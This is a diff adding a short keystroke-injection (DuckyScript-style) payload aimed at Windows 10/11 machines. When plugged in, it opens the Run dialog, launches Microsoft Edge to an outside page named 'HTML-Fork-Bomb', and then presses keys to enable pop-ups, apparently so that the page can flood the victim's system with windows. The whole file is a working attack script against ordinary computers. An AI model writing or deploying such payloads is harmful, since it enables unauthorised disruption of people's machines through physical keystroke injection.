@@ -1,0 +1,14 @@
+REM Target 10-11
+REM FP edit of JB script
+DELAY 500
+GUI R
+DELAY 1000
+STRING microsoft-edge:https://jonnybanana.github.io/HTML-Fork-Bomb.github.io/
+DELAY 200
+ENTER
+REM set a long delay to give time to this disgusting browser
+DELAY 3000
+REM it's time to enable Pop-Up
+TAB
+DELAY 200
+ENTER
